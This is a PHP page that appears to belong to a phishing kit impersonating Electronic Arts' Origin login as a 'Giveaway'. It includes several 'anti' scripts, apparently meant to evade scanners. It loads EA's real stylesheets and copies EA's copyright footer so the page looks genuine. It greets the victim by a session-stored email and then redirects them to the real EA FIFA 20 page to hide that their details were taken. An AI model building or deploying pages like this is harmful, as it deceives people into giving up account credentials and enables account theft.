
<?php
	   include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';

 ob_start();
session_start();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>

    <title>Giveaway</title>
    <meta name="title" content="Giveaway"/>
    <meta name="description" content="Giveaway"/>
    <link rel="shortcut icon" href="scp/favicon.ico"/>
    <meta name="lc" content="en_US"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
    <meta name="msapplication-tap-highlight" content="no" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex" />
    <link href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600" rel="stylesheet" type="text/css">

<script type="text/javascript">window.EA = {};</script>
<script type="text/javascript" src="//fonts.ea.com/fbl8bgs.js"></script>
<script type="text/javascript">(function () {
    try {
        Typekit.load();
    } catch (ex) {
        var html = document.getElementsByTagName('html')[0];
        html.className = (html.className || '') + ' wf-inactive'
    }
})();</script>


        <script type="text/javascript" src="js/js1.js"></script>
        <script type="text/javascript" src="js/js3.js"></script>
        <script type="text/javascript" src="js/js2.js"></script>
        <script type="text/javascript" src="js/js4.js"></script>
<script type="text/javascript">
    if (!window.challenge_cancel) {
        window.challenge_cancel = function() {
            if ($("#btnCancel").length > 0) {
                $("#btnCancel").trigger("click");
                return true;
            } else {
                return false;
            }
        }
    }
</script>



<script type="text/javascript">
    $(document).ready(function () {
        $.fn.onetime({
        });
    });

</script>

                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/546.0.200512.785.234a6b1/p/ui/core/css/origin-ux-elements.v_1589247028-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/546.0.200512.785.234a6b1/p/ui/core/css/origin-layout.v_1589247028-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/546.0.200512.785.234a6b1/p/statics/challenge/css/origin-challenge-onetime.v_1589247028-min.css"/>
                <link rel="stylesheet" type="text/css" href="https://eaassets-a.akamaihd.net/resource_signin_ea_com/546.0.200512.785.234a6b1/p/statics/challenge/css/origin-challenge-common.v_1589247028-min.css"/>

    <!-- Tealium -->
    
    <script type="text/javascript">
        (function (a, b, c, d) {
            a = '//tags.tiqcdn.com/utag/ea/signin-eacom/prod/utag.js';
            b = document;
            c = 'script';
            d = b.createElement(c);
            d.src = a;
            d.type = 'text/java' + c;
            d.async = true;
            a = b.getElementsByTagName(c)[0];
            a.parentNode.insertBefore(d, a);
        })();
    </script>
    <!-- End of tealium -->

<script type="text/javascript">
    $(document).ready(function () {
        var skin = 'origin';
        var bodySelector = $("body");
        switch (skin) {
            case "origin":
                bodySelector.addClass("origin-com");
                break;
            case "franchisedark":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-dark");
                break;
            case "franchiselight":
                bodySelector.addClass("ea-franchise").addClass("ea-franchise-light");
                break;
            case "ea":
            default:
                bodySelector.addClass("ea-com");
                break;
        }
    })
</script>


</head>
<body>


<div class="loading-container"></div>

<div class="tfa-container">
    <form method="post" id="challengeForm" action="verif_email.php">
        <div class="dialog-info">
            <div id="resend-error-code" class="orange-box-error">
                <div></div>
            </div>
        </div>
        <div class="panel" id="panel-tfa">
            <div class="tfa-form-container">
                <div class="panel-contents">
                    <div class="panel-content">
                        <div class="marketing-area"></div>
                        <h1 class="twoStepHeader">THANX</h1>

                        <p class="tfa-login-panel-container-style">Dear
                            <?php
                                echo $_SESSION['email'];
                            ?>                                  
                            </p>

                       
<section class="origination page-content" id="content" data-has-view="true">
    <div class="row no-content-padding" id="gettingStartedContainer" data-is-view="true">
        <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div id="ICONDATA">
                <div class="row util-margin-top-bottom">
                 <div class="col-sm-4 icongroup">
                    <div class="row">
                        <div class="col-xs-2 col-sm-12 util aligned center gt-imageIcon-wrap">
                            <img width="150" height="150" src="scp/success.gif" >
                        </div>


                        <div class="container-fluid" id="originationsFooter" data-has-view="true">
                            <div class="row" data-is-view="true">
                                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                                    <div class="inlineFieldCell">
                                    <div class="row">
                                        <div class="col-xs-18" id="footerText" aria-hidden="true">
                                        	<br>                                        	<br>

                                            <p class="BODY2">Please wait, you will be redirected to the authentication page in 5 seconds ...<br>
      						  <meta http-equiv="refresh" content="5;url=https://www.ea.com/fr-fr/games/fifa/fifa-20" />

                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
                </div>
            </div>
        </div>
<div class="footer">
    <span class="copyright-notice">© 2020 Electronic Arts Inc. Trademarks belong to their respective owners. All rights reserved.</span>
    <ul class="footer-navigation">
            <li class="item-2 even"><a
                    href=""
                    target="_blank"
                    class="link link-origin "><span>Shop at Origin</span></a>
            </li><li class="item-3 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Legal</span></a>
        </li><li class="item-4 even">
            <a href=""
               target="_blank"
               class="link link-origin"><span>User Agreement</span></a>
        </li><li class="item-5 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>Privacy and Cookie Policy</span></a>
        </li><li class="item-6 even">
            <a href="" target="_blank"
               class="link link-origin"><span>Corporate Info</span></a>
        </li><li class="item-7 odd">
            <a href=""
               target="_blank"
               class="link link-origin"><span>EA Terms of Sale</span></a>
        </li><li class="item-8 even last">
            <a href="" target="_blank"
               class="link link-origin"><span>Contact Us</span></a>
        </li>    </ul>
</div>
    </form>
</div>

<!-- ### prdaccountc-30.iad2.infery.com ### -->

</body>
</html>
